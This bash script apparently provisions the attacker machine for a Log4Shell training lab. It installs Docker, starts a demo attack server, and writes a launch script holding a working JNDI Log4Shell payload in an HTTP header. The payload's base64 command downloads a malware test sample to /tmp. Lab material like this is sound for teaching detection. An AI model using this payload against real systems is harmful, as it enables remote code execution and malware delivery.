#!/bin/bash

# Update hostname for better identification
sudo hostname attacker

echo wait for internet
for i in $(seq 1 60); do
  ping -c 1 one.one.one.one && break
  sleep 5
done
echo done waiting for internet

# Updating yum repositories
sudo yum update -y

# Installing Docker
sudo amazon-linux-extras install docker
sudo yum install -y docker tcpdump

# Starting Docker
sudo service docker start
sudo systemctl enable docker
sudo usermod -a -G docker ec2-user
sudo docker info

# Downloading and Running the Attack App Server Demo App
sudo docker container run -itd --rm --name att-svr -p 8888:8888 -p 1389:1389 us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-svr:1.0

ATTACK_URL='X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
ATTACK_COMMAND="curl 172.16.0.149:8080 -H '${ATTACK_URL}'"
sudo echo "${ATTACK_COMMAND}" >> /tmp/launch_attack.sh
sudo chmod 777 /tmp/launch_attack.sh
